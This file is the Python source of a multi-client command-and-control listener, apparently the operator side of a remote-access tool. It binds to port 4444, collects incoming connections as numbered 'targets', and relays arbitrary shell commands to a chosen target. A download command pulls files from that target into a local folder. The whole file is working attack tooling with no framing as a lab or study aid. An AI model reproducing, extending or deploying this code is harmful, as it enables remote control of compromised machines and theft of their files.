import socket
import threading
import os
import sys
import time
clientlen = 5
rec_size = 1024*1024*100
server_ip = "10.0.0.6"
server_port = 4444
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((server_ip,server_port))
sock.listen(clientlen)
clients = []
def get_clients():
	global clients
	while 1:
		client,addr = sock.accept()
		print("Got connection from %s:%d"%addr)
		clients.append([client,addr])
def get_response(sock):
	recv_len = 1
	bdata = b"";
	while recv_len > 0:
		try:
			bdata = sock.recv(4096)
			recv_len = len(bdata)
			if len(bdata.decode().strip()) > 0:
				print(bdata.decode().replace("\n\n","\n"))
			else:
				break
			bdata = b""
		except:
			break
	print()
def _download_file(fname,client_id):
	global clients
	#clients[client_id-1][0].settimeout(60*5)
	out_file = open("Downloads"+"\\"+fname,"wb")
	out_file.write(b"")
	out_file.close()
	clients[client_id-1][0].send(user_command.encode())
	recv_len = 1
	while recv_len > 0:
		try:
			out_file = open("Downloads"+"\\"+fname,"ab")
			bdata = clients[client_id-1][0].recv(rec_size)
			recv_len = len(bdata)
			if len(bdata) > 0:
				out_file.write(bdata)
				out_file.close()
				bdata = b""
			else:
				break
			bdata = b""
		except:
			break
	out_file.close()
def download_file(fname,client_id):
	threading.Thread(target=_download_file,args=(fname,client_id)).start()
def list_clients():
	global clients
	i = 1
	for client in clients:
		print("%d) %s:%d"%(i,client[1][0],client[1][1]))
		i += 1
threading.Thread(target=get_clients).start()
while 1:
	#os.system("cls")
	print("1) List Clients")
	print("2) Control Client")
	got_response = False
	try:
		user_choice = int(input())
	except:
		continue
	if user_choice == 1:
		list_clients()
		os.system("pause")
	elif user_choice == 2:
		try:
			client_id = int(input("Choose client:"))
		except:
			continue
		user_command = "echo 0"
		while client_id < len(clients)+1:
			try:
				print("target_%d>"%client_id,end="")
				user_command = input().strip()
				if user_command == "q target":
					break
				elif user_command == "?":
					print('''Commands
	pwd - Print out working directory
	cd x - Change working directory to x (relative or absolute)''')
					continue
				elif user_command[:len("download")] == "download":
					fname = user_command.strip().split()[1]
					print("Downloading file \"%s\" to .\\downloads"%fname)
					if not os.path.isdir("Downloads"):
						os.mkdir("Downloads")
					download_file(fname,client_id)
					continue
				clients[client_id-1][0].send(user_command.encode())
				thr = threading.Thread(target=get_response,args=(clients[client_id-1][0],))
				thr.start()
				time.sleep(.5)
			except:
				clients.pop(client_id-1)
				break
